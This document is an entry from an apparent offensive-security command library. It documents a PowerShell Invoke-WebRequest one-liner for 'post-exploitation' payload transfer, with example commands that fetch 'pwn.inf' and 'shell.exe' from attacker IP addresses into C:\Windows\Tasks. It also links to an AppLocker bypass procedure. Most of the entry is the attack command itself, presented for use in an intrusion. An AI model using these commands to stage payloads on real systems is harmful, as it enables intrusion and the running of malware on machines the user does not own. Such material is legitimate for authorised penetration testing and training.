---
id: c2beffac-f04f-4286-a2de-40665be6f080
name: powershell-invoke-webrequest-download-file
type: command
executor: powershell
data: 'Invoke-WebRequest -Uri http://$_REMOTE_IP/$_FILENAME -Outfile $_FILENAME'
output: >-
  PS C:\> Invoke-WebRequest -uri 10.10.14.45/msbuild_nps.xml -Outfile
  msbuild_nps.xml
created_at: '2019-11-14T23:38:41.555233+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - download
  - transfer
verified: true
validated: true
---

# powershell-invoke-webrequest-download-file

## Command

```powershell
Invoke-WebRequest -Uri http://$_REMOTE_IP/$_FILENAME -Outfile $_FILENAME
```

## Description

Downloads a file from a remote HTTP server using PowerShell's Invoke-WebRequest cmdlet and saves it to the specified local path. Useful for transferring payloads or scripts to a target system during post-exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Uri | Full URL to the remote file (e.g., http://IP/filename) | Yes |
| -Outfile | Local path to save the file | Yes |
| $_REMOTE_IP | IP address of the remote server | Yes |
| $_FILENAME | Name of the file to download and save | Yes |

## Examples

### Basic Usage

```powershell
Invoke-WebRequest -Uri http://192.168.1.100/pwn.inf -Outfile C:\Windows\Tasks\pwn.inf
```

### Advanced Usage

With error handling:
```powershell
try { Invoke-WebRequest -Uri http://$_REMOTE_IP/shell.exe -Outfile C:\Windows\Tasks\shell.exe } catch { Write-Output 'Download failed' }
```

## Expected Output

Status code 200 if successful, with the file saved locally. No verbose output by default.

```
PS C:\> Invoke-WebRequest -Uri http://10.10.14.45/pwn.inf -Outfile pwn.inf
PS C:\>
```

## Related

- [[procedures/Windows-AppLocker-Whitelist-Bypass-via-cmstp]]
- [[commands/python3-launch-http-server]]
